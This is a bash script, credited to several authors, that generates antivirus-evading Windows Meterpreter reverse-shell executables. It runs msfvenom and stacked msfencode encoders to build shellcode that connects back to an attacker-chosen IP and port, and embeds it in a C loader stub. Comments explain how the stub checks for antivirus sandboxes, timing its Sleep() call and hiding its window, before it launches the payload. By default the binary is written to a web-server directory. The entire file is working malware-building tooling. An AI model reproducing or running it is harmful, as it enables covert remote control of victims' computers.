#!/bin/bash
# Original concept and script by Astr0baby
# Edited by Vanish3r
# Modified by Kerberos (that's me); big thanks to the two links below!
# Script found here: http://www.youtube.com/watch?v=SNbQaU1qyZ8
# AV evasion stub found here: http://schierlm.users.sourceforge.net/avevasion.html
# Note: there are a lot of versions of this script floating around, this is just mine and all proper attribution has been given as far as I'm aware. I'll gladly amend anything missing upon request.
loc=".msfpayload"
tag="\e[5;32m+\e[0m"

# Run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[0;31mThis script must be run as root.\e[0m" 1>&2
	exit 1
fi

# Clean and re-create temporary directory
rm -rf $loc
mkdir $loc
cd $loc

# Get payload
echo -e "\e[4;35mPayload\e[0m \e[0;36m(empty for https meterpreter)\e[0m: \c"
read pay
if [ "$pay" == "" ]; then pay="windows/meterpreter/reverse_https"; fi # Default to x86

# Get connect-back IP/DDNS
echo -e "\e[0;36mDetected Network Interfaces\e[0m:\e[0;33m"
cat /proc/net/dev | tr -s ' ' | cut -d ' ' -f1,2 | sed -e '1,2d'
echo -e "\e[4;35mInterface\e[0m \e[0;36m(empty for custom IP/DDNS)\e[0m: \c"
read iface

# Get IP of selected interface (or custom IP/DDNS)
OS="$(uname)"
IP=""
if [ "$iface" == "" ]; then
	echo -e "\e[4;35mCustom IP/DDNS\e[0m: \c"
	read IP
else
	case $OS in
		Linux) IP=`ifconfig $iface | grep 'inet addr:' | grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`;;
		*) IP="Unknown";;
	esac
fi

if [[ "$IP" == "Unknown" || "$IP" == "" ]]; then
	echo -e "\e[0;31mError: Failed to determine IP address\e[0m"
	exit 1;
fi

# Get port ...
echo -e "\e[4;35mRemote Listener Port\e[0m: \c"
read port

# Validate port
if [[ $port -gt 65535 || $port -lt 1 ]]; then
	echo -e "\e[0;31mError: Invalid port number, valid ports are 1-65535\e[0m"
	exit 1
fi

# All encoding stages use this setting
echo -e "\e[4;35mEncoding Iterations\e[0m: \c"
read encit

echo -e "\e[4;35mOutput path\e[0m \e[0;36m(/var/www/meter.exe)\e[0m: \c"
read out
if [ "$out" == "" ]; then out="/var/www/meter.exe"; fi

# Verify output path
fpath="$(echo $out | sed 's!\(.*\)/.*!\1!')"
if [ ! -d "$fpath" ]; then
	echo -e "\e[0;31mError: Invalid output path.\e[0m"
        exit 1
fi

# msfvenom check
if [ ! -n "$(which msfvenom)" ]; then
	echo -e "\e[0;31mError: Failed to find msfvenom. Do you have Metasploit installed?\e[0m"
	exit 1
fi

# Generate payload blob (raw byte buffer to insert into C loader stub) via msfvenom (previously used msfpayload)
if [ "$iface" != "" ]; then echo -e "\e[0;36mIP/DDNS\e[0m: \e[0;33m$IP\e[0m"; fi
echo -e "$tag Generating payload blob..."
if [[ $pay != *x64* ]]; then
	# Mingw32 check
	if [ ! -n "$(which i586-mingw32msvc-gcc)" ]; then
		echo -e "\e[0;31mError: Failed to find i586-mingw32msvc-gcc. Try \"apt-get install gcc-mingw32\"\e[0m"
		exit 1
	fi

	# x86 has way more compatible encoders so we can run it through a bunch of times
	msfvenom -p $pay --arch x86 --platform Windows LHOST=$IP LPORT=$port EXITFUNC=process 2> /dev/null | msfencode -e x86/shikata_ga_nai -c $encit -t raw 2> /dev/null | msfencode -e x86/jmp_call_additive -c $encit -t raw 2> /dev/null | msfencode -e x86/call4_dword_xor -c $encit -t raw 2> /dev/null | msfencode -e x86/shikata_ga_nai -c $encit 2> /dev/null 1> payload.c
	sed -e 's/\s+\|buf\s=\s//g' payload.c | sed -e '$a;' > buffer.c
else
	# Mingw64 check
	if [ ! -n "$(which i686-w64-mingw32-gcc)" ]; then
		echo -e "\e[0;31mError: Failed to find i686-w64-mingw32-gcc. Try \"apt-get install gcc-mingw32\"\e[0m"
		exit 1
	fi

	msfvenom -p $pay -f c --arch x86_64 --platform Windows -e x64/xor -i $encit LHOST=$IP LPORT=$port EXITFUNC=process 2> /dev/null 1> payload.c
	sed -e 's/unsigned char buf\[\] =//g' payload.c > buffer.c
fi

# Verify stage 1 succeeded
if [ ! -f payload.c ]; then
	echo -e "\e[0;32mError: Failed to generate the payload blob!\e[0m" 1>&2
	exit 1
fi

# Build loader C source file from template and stage 1 payload blob
echo -e "$tag Building loader..."
echo "#include <windows.h>" >> final.c
echo "#include <stdio.h>" >> final.c
echo "unsigned char micro[]=" >> final.c
cat buffer.c >> final.c
echo "int check(void){MSG msg;DWORD tc;PostThreadMessage(GetCurrentThreadId(),WM_USER+2,23,42);if(!PeekMessage(&msg,(HWND)-1,0,0,0)) return -1;if(msg.message!=WM_USER+2||msg.wParam!=23||msg.lParam!=42) return -1;tc=GetTickCount();Sleep(650);if(((GetTickCount()-tc)/300)!=2) return -1;return 0;}" >> final.c
echo "int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR szCmdLine,int iCmdShow){CreateWindow(\"\",\"\",WS_DISABLED,0,0,0,0,NULL,NULL,hInstance,NULL);if(check()==-1) return 0;((void (*)())micro)();Sleep(5000);return 0;}" >> final.c

###
### Breakdown of C above loader stub
###
# #include <windows.h>
# #include <stdio.h>
#
# unsigned char micro[] = "PAYLOAD_BUFFER";
#
# int check(void) {
#	MSG msg;
#	DWORD tc;
#
#	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42); // Post a message to the thread that usually indicates the application has finished initializing
#	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0)) return -1; // Read the message back
#	if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42) return -1; // Verify that the message returned is the same as the message posted
#	tc = GetTickCount(); // Store current tick count for verification of sleep() call
#	Sleep(650); // Sleep for 650ms (possibly outrunning the sandbox's lifetime)
#	if(((GetTickCount() - tc) / 300) != 2) return -1; // Verify sleep() call actually slept (and AV didn't nop the sleep() function)
#	return 0;
# }
#
# int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow) {
#	CreateWindow(\"\",\"\", WS_DISABLED, 0, 0, 0, 0, NULL, NULL, hInstance, NULL); // Create the main window (all Windows applications have one) as hidden by default so it doesn't flash on-screen quickly
#	if(check() == -1) return 0; // Verify that we're not running in an AV sandbox
#	((void (*)())micro)(); // Launch payload
#	Sleep(5000);
#	return 0;
# }

# Compilation
echo -e "$tag Compiling...\e[0;31m"

if [[ $pay != *x64* ]]; then
	i586-mingw32msvc-gcc -Wall -o tmp.o -c final.c
else
	i686-w64-mingw32-gcc -Wall -o tmp.o -c final.c
fi

if [ -e "tmp.o" ]; then
	if [[ $pay != *x64* ]]; then
		i586-mingw32msvc-gcc -o $out tmp.o -s -lcomctl32 -Wl,--subsystem,windows
	else
		i686-w64-mingw32-gcc -o $out tmp.o -s -lcomctl32 -Wl,--subsystem,windows
	fi

	if [ -e "$out" ]; then
		if [[ $pay != *x64* ]]; then
			i586-mingw32msvc-strip --strip-debug $out
		else
			i686-w64-mingw32-strip --strip-debug $out
		fi

		# Cleanup
		if [ "$1" != "noclean" ]; then
			echo -e "$tag Cleaning up..."
			rm -f payload.c
			rm -f buffer.c
			rm -f final.c
			rm -f tmp.o
			cd ..
			rmdir .msfpayload
		else
			echo -e "$tag noclean flag detected, preserving files in .msfpayload"
		fi

		sumx=`sha1sum "$out" | cut -d " " -f1`
		echo -e "$tag Payload saved to \e[0;33m$out\e[0m!"
		echo -e "$tag Checksum: \e[0;34m$sumx\e[0m"
		echo -e "\e[1;35mFinished. Have a nice day. :)\e[0m"
	else
		echo -e "\e[0;31mFailed to link loader\e[0m"
		exit 1
	fi
else
	echo -e "\e[0;31m Failed to assemble and compile loader\e[0m"
	exit 1
fi
